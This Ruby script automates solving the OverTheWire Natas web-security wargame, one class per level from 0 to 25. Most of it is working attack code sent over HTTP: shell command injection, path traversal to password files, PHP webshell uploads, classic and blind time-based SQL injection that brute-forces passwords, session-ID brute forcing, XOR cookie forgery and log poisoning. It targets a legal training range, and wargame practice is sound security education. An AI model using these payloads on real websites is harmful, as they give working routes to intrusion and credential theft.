# frozen_string_literal: true

require 'net/http'
require 'base64'
require 'yaml'
require 'json'

##
# OverTheWire wargame Natas
class Natas
  MAXLEVEL = 34

  attr_accessor :levels, :level

  def initialize(shell)
    @shell = shell
    @level = nil
    @levels = []
    ObjectSpace.each_object(Class).select { |c| c < NatasLevelBase }.each { |c| @levels << c.new(@shell) }
    @levels.sort! { |a, b| a.level <=> b.level }
  end

  def exec
    level = @levels.detect { |l| l.level == @level }

    raise StandardError, "Level #{@level} not implemented" if level.nil?
    raise StandardError, "Level #{@level} has no password" if level.password.nil?

    password = level.exec
    level = @levels.detect { |l| l.level == @level + 1 }
    return if level.nil?

    level.password = password
  end

  def to_yaml
    data = {}
    @levels.each do |level|
      data[level.level] = level.password
    end
    YAML.dump(data)
  end
end

##
# Base class of level
class NatasLevelBase
  HOST = 'natas.labs.overthewire.org'
  PORT = 80
  LOGIN = 'natas'
  WEBPASS = '/etc/natas_webpass'
  LEVEL = nil
  PASSWORD_LENGTH = 32

  attr_reader :login
  attr_accessor :password

  def initialize(shell)
    @shell = shell
    @login = LOGIN + self.class::LEVEL.to_s
    @password = nil
    @client = Net::HTTP.new("#{@login}.#{HOST}", PORT)
  end

  def exec; end

  def level
    self.class::LEVEL
  end

  def get(query, headers = {})
    request = Net::HTTP::Get.new(query, headers)
    request.basic_auth(@login, @password)

    response = @client.request(request)

    raise StandardError, 'Unauthorized' if response.instance_of?(Net::HTTPUnauthorized)

    response
  end

  def post(query, headers = {}, data = nil, multipart: false)
    request = Net::HTTP::Post.new(query, headers)
    request.basic_auth(@login, @password)
    unless data.nil?
      request.set_form(
        data,
        multipart ? 'multipart/form-data' : 'application/x-www-form-urlencoded'
      )
    end

    response = @client.request(request)

    raise StandardError, 'Unauthorized' if response.instance_of?(Net::HTTPUnauthorized)

    response
  end

  private

  def log(message)
    puts @shell.console.bold.magenta("[#{@login}] ") + message
  end

  def found(password)
    log(@shell.console.green('Password found: ') + @shell.console.cyan.bold(password))
    password
  end

  def not_found
    raise StandardError, 'Password not found'
  end
end

##
# Level 0
class NatasLevel0 < NatasLevelBase
  LEVEL = 0
  PASSWORD = 'natas0'
  PAGE = '/'

  def initialize(*)
    super
    @password = PASSWORD
  end

  def exec
    log("Parsing the page: #{PAGE}")
    data = get('/').body
    match = /<!--The password for natas1 is (\w{32}) -->/.match(data)
    not_found unless match
    found(match[1])
  end
end

##
# Level 1
class NatasLevel1 < NatasLevelBase
  LEVEL = 1
  PAGE = '/'

  def exec
    log("Parsing the page: #{PAGE}")
    data = get(PAGE).body
    match = /<!--The password for natas2 is (\w{32}) -->/.match(data)
    not_found unless match
    found(match[1])
  end
end

##
# Level 2
class NatasLevel2 < NatasLevelBase
  LEVEL = 2
  USERS_FILE = '/files/users.txt'

  def exec
    log("Parsing users file: #{USERS_FILE}")
    data = get(USERS_FILE).body
    match = /natas3:(\w{32})/.match(data)
    not_found unless match
    found(match[1])
  end
end

##
# Level 3
class NatasLevel3 < NatasLevelBase
  LEVEL = 3
  USERS_FILE = '/s3cr3t/users.txt'

  def exec
    log("Parsing secret users file: #{USERS_FILE}")
    data = get(USERS_FILE).body
    match = /natas4:(\w{32})/.match(data)
    not_found unless match
    found(match[1])
  end
end

##
# Level 4
class NatasLevel4 < NatasLevelBase
  LEVEL = 4
  PAGE = '/'

  def exec
    referer = URI::HTTP.build(
      host: "natas5.#{HOST}",
      path: '/'
    )

    log("Setting the Referer HTTP header: #{referer}")
    log("Parsing the page: #{PAGE}")
    data = get(
      PAGE,
      {
        'Referer' => referer.to_s
      }
    ).body

    match = /The password for natas5 is (\w{32})/.match(data)
    not_found unless match
    found(match[1])
  end
end

##
# Level 5
class NatasLevel5 < NatasLevelBase
  LEVEL = 5
  PAGE = '/'

  def exec
    cookie = 'loggedin=1'
    log("Setting the Cookie HTTP header: #{cookie}")

    log("Parsing the page: #{PAGE}")
    data = get(
      PAGE,
      {
        'Cookie' => cookie
      }
    ).body

    match = /The password for natas6 is (\w{32})/.match(data)
    not_found unless match
    found(match[1])
  end
end

##
# Level 6
class NatasLevel6 < NatasLevelBase
  LEVEL = 6

  def exec
    data = get('/includes/secret.inc').body
    match = /\$secret = "(\w{19})";/.match(data)
    not_found unless match
    data = post(
      '/',
      {},
      {
        'submit' => '',
        'secret' => match[1]
      }
    ).body
    match = /The password for natas7 is (\w{32})/.match(data)
    not_found unless match
    found(match[1])
  end
end

##
# Level 7
class NatasLevel7 < NatasLevelBase
  LEVEL = 7

  def exec
    data = get("/?page=#{WEBPASS}/natas8").body
    match = /<br>\n(\w{32})\n\n<!--/.match(data)
    not_found unless match
    found(match[1])
  end
end

##
# Level 8
class NatasLevel8 < NatasLevelBase
  LEVEL = 8

  def exec
    data = get('/index-source.html').body
    match = /\$encodedSecret&nbsp;=&nbsp;"(\w{32})";/.match(data)
    not_found unless match
    secret = Base64.decode64([match[1]].pack('H*').reverse)
    data = post(
      '/',
      {},
      {
        'submit' => '',
        'secret' => secret
      }
    ).body
    match = /The password for natas9 is (\w{32})/.match(data)
    not_found unless match
    found(match[1])
  end
end

##
# Level 9
class NatasLevel9 < NatasLevelBase
  LEVEL = 9

  def exec
    data = get(
      "/?#{URI.encode_www_form(
        {
          'needle' => "'' #{WEBPASS}/natas10;"
        }
      )}"
    ).body
    match = %r(Output:\n<pre>\n(\w{32})\n</pre>).match(data)
    not_found unless match
    found(match[1])
  end
end

##
# Level 10
class NatasLevel10 < NatasLevelBase
  LEVEL = 10

  def exec
    data = get(
      "/?#{URI.encode_www_form(
        {
          'needle' => "'' -m 1 #{WEBPASS}/natas11"
        }
      )}"
    ).body
    match = /natas11:(\w{32})\n/.match(data)
    not_found unless match
    found(match[1])
  end
end

##
# Level 11
class NatasLevel11 < NatasLevelBase
  LEVEL = 11
  PAGE = '/'
  DEFAULT_DATA = {
    'showpassword'  => 'no',
    'bgcolor'       => '#ffffff'
  }.freeze

  def xor_encrypt(data, key)
    out = String.new
    data.chars.each_with_index do |c, i|
      out << (c.ord ^ key[i % key.length].ord).chr
    end
    out
  end

  def exec
    log("Getting the Cookie HTTP header from the page: #{PAGE}")
    response = get(PAGE)
    cookie = response['Set-Cookie']
    data = cookie.split('=')[1]
    data = URI.decode_www_form_component(data)
    log("Data: #{data}")

    log('Searching the XOR encryption key')
    key = xor_encrypt(
      Base64.strict_decode64(data),
      JSON.generate(DEFAULT_DATA)
    )
    log("Key found: #{key}")
    log('Searching a pattern of the key')
    pattern = String.new
    key.chars.each_with_index do |c, i|
      pattern << c
      break if pattern == key[(i + 1)..(i + pattern.length)]
    end
    log("Pattern found: #{pattern}")
    key = pattern

    data = DEFAULT_DATA.dup
    data['showpassword'] = 'yes'
    data = JSON.generate(data)
    log("Encrypting of new data: #{data}")
    data = xor_encrypt(
      data,
      key
    )

    data = "data=#{Base64.strict_encode64(data)}"
    log("Setting the new Cookie HTTP header: #{data}")
    log("Parsing the page: #{PAGE}")
    data = get(
      PAGE,
      {
        'Cookie' => data
      }
    ).body
    match = /The password for natas12 is (\w{32})<br>/.match(data)
    not_found unless match
    found(match[1])
  end
end

##
# Level 12
class NatasLevel12 < NatasLevelBase
  LEVEL = 12
  PAGE = '/'
  PAYLOAD = %(<? echo(file_get_contents('#{WEBPASS}/natas13')); ?>)

  def exec
    data = [
      ['filename', 'file.php'],
      ['uploadedfile', PAYLOAD, { filename: 'uploadedfile' }]
    ]
    log('Uploading file')
    data = post(PAGE, {}, data, multipart: true).body
    match = %r{The file <a href="(upload/\w+.php)">}.match(data)
    not_found unless match
    file = "/#{match[1]}"
    log("Getting file #{file}")
    data = get(file).body
    match = /(\w{32})/.match(data)
    not_found unless match
    found(match[1])
  end
end

##
# Level 13
class NatasLevel13 < NatasLevelBase
  LEVEL = 13
  PAGE = '/'
  PAYLOAD = %(\xff\xd8\xff<? echo(file_get_contents('#{WEBPASS}/natas14')); ?>)

  def exec
    data = [
      ['filename', 'file.php'],
      ['uploadedfile', PAYLOAD, { filename: 'uploadedfile' }]
    ]
    log('Uploading file')
    data = post(PAGE, {}, data, multipart: true).body
    match = %r{The file <a href="(upload/\w+.php)">}.match(data)
    not_found unless match
    file = "/#{match[1]}"
    log("Getting file #{file}")
    data = get(file).body
    match = /(\w{32})/.match(data)
    not_found unless match
    found(match[1])
  end
end

##
# Level 14
class NatasLevel14 < NatasLevelBase
  LEVEL = 14
  PAGE = '/'
  PAYLOAD = %(" OR 1=1 #)

  def exec
    data = post(
      PAGE,
      {},
      {
        'username' => PAYLOAD,
        'password' => ''
      }
    ).body
    match = /The password for natas15 is (\w{32})<br>/.match(data)
    not_found unless match
    found(match[1])
  end
end

##
# Levle 15
class NatasLevel15 < NatasLevelBase
  LEVEL = 15
  PAGE = '/'
  DICT =
    ('a'..'z').to_a +
    ('A'..'Z').to_a +
    ('0'..'9').to_a

  def exec
    password = String.new
    log('Bruteforcing password')
    PASSWORD_LENGTH.times do
      DICT.each do |c|
        payload = %(natas16" AND password LIKE BINARY "#{password}#{c}%" #)
        data = post(
          PAGE,
          {},
          { 'username' => payload }
        ).body
        match = /This user exists/.match(data)
        if match
          log(password << c)
          break
        end
      end
    end

    not_found if password.length != PASSWORD_LENGTH
    found(password)
  end
end

##
# Level 16
class NatasLevel16 < NatasLevelBase
  LEVEL = 16
  PAGE = '/'
  PAYLOAD = %(NON_EXIST $(cat #{WEBPASS}/natas17 > /proc/$$/fd/1))

  def exec
    query = URI.encode_www_form('needle' => PAYLOAD)
    data = get("#{PAGE}?#{query}").body
    match = %r(<pre>\n(\w{32})\n</pre>).match(data)
    not_found unless match
    found(match[1])
  end
end

##
# Level 17
class NatasLevel17 < NatasLevelBase
  LEVEL = 17
  PAGE = '/'
  INTERVAL = 5
  DICT =
    ('a'..'z').to_a +
    ('A'..'Z').to_a +
    ('0'..'9').to_a

  def exec
    password = String.new
    log('Bruteforcing password')
    PASSWORD_LENGTH.times do
      DICT.each do |c|
        payload = %(natas18" AND password LIKE BINARY "#{password}#{c}%" AND SLEEP(#{INTERVAL}) #)
        time = Time.now
        post(
          PAGE,
          {},
          { 'username' => payload }
        )
        if Time.now - time >= INTERVAL
          log(password << c)
          break
        end
      end
    end

    not_found if password.length != PASSWORD_LENGTH
    found(password)
  end
end

##
# Level 18
class NatasLevel18 < NatasLevelBase
  LEVEL = 18
  PAGE = '/'
  MAX_ID = 640

  def exec
    log('Bruteforcing PHPSESSID')
    MAX_ID.times do |id|
      data = post(
        PAGE,
        {
          'Cookie' => "PHPSESSID=#{id}"
        },
        {
          'username' => 'admin',
          'password' => ''
        }
      ).body
      match = %r(Password: (\w{32})</pre>).match(data)
      next unless match

      log("Found session: #{id}")
      return found(match[1])
    end

    not_found
  end
end

##
# Level 19
class NatasLevel19 < NatasLevelBase
  LEVEL = 19
  PAGE = '/'
  MAX_ID = 999
  USERNAME = 'admin'

  def exec
    log('Bruteforcing PHPSESSID')
    MAX_ID.times do |id|
      session_id = "#{id}-#{USERNAME}".unpack1('H*')
      data = post(
        PAGE,
        {
          'Cookie' => "PHPSESSID=#{session_id}"
        },
        {
          'username' => USERNAME,
          'password' => ''
        }
      ).body
      match = %r(Password: (\w{32})</pre>).match(data)
      next unless match

      log("Found session: #{session_id}")
      return found(match[1])
    end

    not_found
  end
end

##
# Level 20
class NatasLevel20 < NatasLevelBase
  LEVEL = 20
  PAGE = '/'
  PAYLOAD = "user\nadmin 1"

  def exec
    response = post(PAGE, {}, { 'name' => PAYLOAD })
    data = get(PAGE, { 'Cookie' => response['Set-Cookie'] }).body
    match = %r(Password: (\w{32})</pre>).match(data)
    not_found unless match
    found(match[1])
  end
end

##
# Level 21
class NatasLevel21 < NatasLevelBase
  LEVEL = 21
  PAGE = '/'
  EXP_HOST = "natas21-experimenter.#{HOST}"

  def exec
    response = get(PAGE)
    cookie = response['Set-Cookie']
    session_id = cookie.split('; ').first
    client = Net::HTTP.new(EXP_HOST, PORT)
    request = Net::HTTP::Post.new(PAGE, { 'Cookie' => session_id })
    request.basic_auth(@login, @password)
    request.set_form(
      {
        'admin' => 1,
        'submit' => 'Update'
      }
    )
    client.request(request)
    data = get(PAGE, { 'Cookie' => session_id }).body
    match = %r(Password: (\w{32})</pre>).match(data)
    not_found unless match
    found(match[1])
  end
end
##

# Level 22
class NatasLevel22 < NatasLevelBase
  LEVEL = 22
  PAGE = '/?revelio'

  def exec
    data = get(PAGE).body
    match = %r(Password: (\w{32})</pre>).match(data)
    not_found unless match
    found(match[1])
  end
end

# Level 23
class NatasLevel23 < NatasLevelBase
  LEVEL = 23
  PAGE = '/?passwd=11iloveyou'

  def exec
    data = get(PAGE).body
    match = %r(Password: (\w{32})</pre>).match(data)
    not_found unless match
    found(match[1])
  end
end

# Level 24
class NatasLevel24 < NatasLevelBase
  LEVEL = 24
  PAGE = '/?passwd[]'

  def exec
    data = get(PAGE).body
    match = %r(Password: (\w{32})</pre>).match(data)
    not_found unless match
    found(match[1])
  end
end

# Level 25
class NatasLevel25 < NatasLevelBase
  LEVEL = 25
  PAGE = '/'
  PAYLOAD = %(Password: <? echo(file_get_contents('#{WEBPASS}/natas26')); ?>)

  def exec
    response = get(
      "#{PAGE}?lang=natas_webpass",
      { 'User-Agent' => PAYLOAD }
    )
    cookie = response['Set-Cookie'].split('; ')[0]
    session_id = cookie.split('=')[1]
    data = get("#{PAGE}/?lang=....//logs/natas25_#{session_id}.log").body
    match = /Password: (\w{32})\n/.match(data)
    not_found unless match
    found(match[1])
  end
end

# Level 26
class NatasLevel26 < NatasLevelBase
  LEVEL = 26
end
